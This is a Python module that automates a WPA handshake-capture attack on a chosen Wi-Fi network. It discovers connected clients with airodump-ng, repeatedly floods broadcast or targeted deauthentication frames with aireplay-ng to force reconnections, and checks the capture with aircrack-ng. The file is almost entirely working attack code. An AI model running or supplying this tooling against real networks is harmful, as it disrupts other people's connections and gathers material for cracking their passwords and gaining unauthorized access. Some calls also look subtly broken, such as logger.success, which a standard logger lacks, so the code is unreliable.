import logging
import threading
import subprocess
import time
from typing import Optional, List, Callable
from dataclasses import dataclass
import re

logger = logging.getLogger(__name__)


@dataclass
class CaptureConfig:
    interface: str
    bssid: str
    ssid: str
    channel: int
    output_file: str
    timeout: int = 120
    deauth_count: int = 10
    deauth_interval: float = 0.5


class AdvancedHandshakeCapture:
    """Advanced handshake capture with optimized deauth"""
    
    def __init__(self, config: CaptureConfig):
        self.config = config
        self.capture_process = None
        self.capture_thread = None
        self.handshake_found = False
        self.stop_flag = False
        self.packet_count = 0
        
    def start_capture(self) -> bool:
        """Start tcpdump/airodump capture"""
        logger.info(f"[*] Starting handshake capture on {self.config.ssid}")
        
        try:
            cmd = [
                'airodump-ng',
                '-c', str(self.config.channel),
                '-b', self.config.bssid,
                '-w', self.config.output_file,
                '--output-format', 'pcap',
                self.config.interface
            ]
            
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            logger.info("[+] Capture started")
            return True
            
        except Exception as e:
            logger.error(f"[-] Failed to start capture: {e}")
            return False
    
    def deauthenticate_clients(self, client_macs: Optional[List[str]] = None) -> int:
        """Perform optimized deauthentication"""
        deauth_count = 0
        
        if not client_macs:
            # Broadcast deauth
            for i in range(self.config.deauth_count):
                try:
                    cmd = [
                        'aireplay-ng',
                        '-0',  # Deauth mode
                        '1',   # Send 1 frame per burst
                        '-a', self.config.bssid,
                        self.config.interface
                    ]
                    
                    subprocess.run(cmd, timeout=5, capture_output=True)
                    deauth_count += 1
                    time.sleep(self.config.deauth_interval)
                    
                except Exception as e:
                    logger.debug(f"Deauth attempt failed: {e}")
        else:
            # Targeted deauth per client
            for mac in client_macs:
                for i in range(self.config.deauth_count // len(client_macs)):
                    try:
                        cmd = [
                            'aireplay-ng',
                            '-0', '5',
                            '-a', self.config.bssid,
                            '-c', mac,
                            self.config.interface
                        ]
                        
                        subprocess.run(cmd, timeout=5, capture_output=True)
                        deauth_count += 1
                        time.sleep(self.config.deauth_interval)
                        
                    except Exception as e:
                        logger.debug(f"Targeted deauth failed: {e}")
        
        logger.info(f"[+] Sent {deauth_count} deauth frames")
        return deauth_count
    
    def verify_handshake(self) -> bool:
        """Verify if handshake was captured"""
        try:
            cmd = [
                'aircrack-ng',
                '-J', self.config.output_file.replace('.cap', ''),
                f"{self.config.output_file}*"
            ]
            
            result = subprocess.run(
                cmd,
                timeout=10,
                capture_output=True,
                text=True
            )
            
            if 'WPA' in result.stdout or 'PMKID' in result.stdout:
                logger.success("[+] Handshake verified")
                return True
            
        except Exception as e:
            logger.debug(f"Handshake verification: {e}")
        
        return False
    
    def capture(self, callback: Optional[Callable] = None) -> bool:
        """Execute handshake capture with deauth"""
        if not self.start_capture():
            return False
        
        start_time = time.time()
        last_deauth = start_time
        deauth_interval = 5  # Deauth every 5 seconds
        
        try:
            while time.time() - start_time < self.config.timeout:
                # Periodic deauthentication
                if time.time() - last_deauth > deauth_interval:
                    self.deauthenticate_clients()
                    last_deauth = time.time()
                
                # Verify handshake
                if self.verify_handshake():
                    self.handshake_found = True
                    logger.success("[+] Handshake captured successfully!")
                    if callback:
                        callback(True)
                    return True
                
                time.sleep(1)
            
            logger.warning("[-] Handshake capture timeout")
            if callback:
                callback(False)
            return False
            
        finally:
            self.stop_capture()
    
    def stop_capture(self):
        """Stop the capture process"""
        if self.capture_process:
            self.capture_process.terminate()
            try:
                self.capture_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.capture_process.kill()
            logger.info("[*] Capture stopped")


class ClientDiscovery:
    """Discover connected clients on target network"""
    
    def __init__(self, interface: str, bssid: str, channel: int):
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.clients = []
    
    def discover(self, timeout: int = 30) -> List[str]:
        """Discover connected clients"""
        logger.info("[*] Discovering connected clients...")
        
        try:
            cmd = [
                'airodump-ng',
                '-c', str(self.channel),
                '-b', self.bssid,
                '--output-format', 'csv',
                '-w', '/tmp/client_discovery',
                self.interface
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(timeout)
            process.terminate()
            
            # Parse CSV output
            try:
                with open('/tmp/client_discovery-01.csv', 'r') as f:
                    for line in f:
                        # Client MAC pattern
                        match = re.search(r'([A-F0-9]{2}(?::[A-F0-9]{2}){5})', line)
                        if match and match.group(1) != self.bssid:
                            self.clients.append(match.group(1))
            except FileNotFoundError:
                pass
            
            logger.info(f"[+] Found {len(set(self.clients))} clients")
            return list(set(self.clients))
            
        except Exception as e:
            logger.error(f"Client discovery failed: {e}")
        
        return []
